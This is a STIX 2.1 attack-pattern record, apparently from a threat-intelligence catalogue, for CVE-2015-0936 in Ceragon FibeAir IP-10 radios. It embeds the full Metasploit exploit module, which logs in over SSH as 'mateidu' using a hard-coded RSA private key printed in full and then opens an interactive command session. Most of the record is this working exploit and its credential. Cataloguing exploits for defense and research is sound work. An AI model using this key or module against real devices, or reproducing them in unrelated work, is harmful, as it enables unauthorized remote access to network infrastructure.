{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d64fd702-a10c-45f5-a065-b6c37b64f3c1",
    "created": "2024-08-14T16:58:11.422106Z",
    "modified": "2024-08-14T16:58:11.42211Z",
    "name": "Ceragon FibeAir IP-10 SSH Private Key Exposure",
    "description": " Ceragon ships a public/private key pair on FibeAir IP-10 devices that allows passwordless authentication to any other IP-10 device. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as the \"mateidu\" user.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => false 'Targets' => [ [ 'Universal', {} ] ] 'Payload' => { 'Compat' => { 'PayloadType' => 'cmd_interact' 'ConnectionType' => 'find'  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/ceragon_fibeair_known_privkey.rb",
            "external_id": "ceragon_fibeair_known_privkey.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0936"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Ceragon FibeAir IP-10 SSH Private Key Exposure',\n          'Description' => %q{\n            Ceragon ships a public/private key pair on FibeAir IP-10 devices\n            that allows passwordless authentication to any other IP-10 device.\n            Since the key is easily retrievable, an attacker can use it to\n            gain unauthorized remote access as the \"mateidu\" user.\n          },\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Privileged' => false,\n          'Targets' => [ [ 'Universal', {} ] ],\n          'Payload' => {\n            'Compat' => {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n          },\n          'Author' => [\n            'hdm', # Discovery\n            'todb' # Metasploit module and advisory text (mostly copy-paste)\n          ],\n          'License' => MSF_LICENSE,\n          'References' => [\n            ['CVE', '2015-0936'],\n            ['URL', 'https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15'], # Original Disclosure\n          ],\n          'DisclosureDate' => '2015-04-01', # Not a joke\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user)\n    opt_hash = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: [ key_data ]\n    })\n    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, user, opt_hash)\n      end\n    rescue Rex::ConnectionError\n      return nil\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return nil\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return nil\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n      return nil\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return nil\n    end\n\n    if ssh_socket\n\n      # Create a new session from the socket, then dump it.\n      conn = Net::SSH::CommandStream.new(ssh_socket)\n      ssh_socket = nil\n\n      return conn\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    conn = do_login('mateidu')\n    if conn\n      print_good \"#{rhost}:#{rport} - Successful login\"\n      handler(conn.lsock)\n    end\n  end\n\n  def key_data\n    <<~EOF\n      -----BEGIN RSA PRIVATE KEY-----\n      MIICWwIBAAKBgQDBEh0OUdoiplc0P+XW8VPu57etz8O9eHbLHkQW27EZBEdXEYxr\n      MOFXi+PkA0ZcNDBRgjSJmHpo5WsPLwj/L3/L5gMYK+yeqsNu48ONbbqzZsFdaBQ+\n      IL3dPdMDovYo7GFVyXuaWMQ4hgAJEc+kk1hUaGKcLENQf0vEyt01eA/k6QIBIwKB\n      gQCwhZbohVm5R6AvxWRsv2KuiraQSO16B70ResHpA2AW31crCLrlqQiKjoc23mw3\n      CyTcztDy1I0stH8j0zts+DpSbYZnWKSb5hxhl/w96yNYPUJaTatgcPB46xOBDsgv\n      4Lf4GGt3gsQFvuTUArIf6MCJiUn4AQA9Q96QyCH/g4mdiwJBAPHdYgTDiQcpUAbY\n      SanIpq7XFeKXBPgRbAN57fTwzWVDyFHwvVUrpqc+SSwfzhsaNpE3IpLD9RqOyEr6\n      B8YrC2UCQQDMWrUeNQsf6xQer2AKw2Q06bTAicetJWz5O8CF2mcpVFYc1VJMkiuV\n      93gCvQORq4dpApJYZxhigY4k/f46BlU1AkAbpEW3Zs3U7sdRPUo/SiGtlOyO7LAc\n      WcMzmOf+vG8+xesCDOJwIj7uisaIsy1/cLXHdAPzhBwDCQDyoDtnGty7AkEAnaUP\n      YHIP5Ww0F6vcYBMSybuaEN9Q5KfXuPOUhIPpLoLjWBJGzVrRKou0WeJElPIJX6Ll\n      7GzJqxN8SGwqhIiK3wJAOQ2Hm068EicG5WQoS+8+KIE/SVHWmFDvet+f1vgDchvT\n      uPa5zx2eZ2rxP1pXHAdBSgh799hCF60eZZtlWnNqLg==\n      -----END RSA PRIVATE KEY-----\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-01, # Not a joke"
}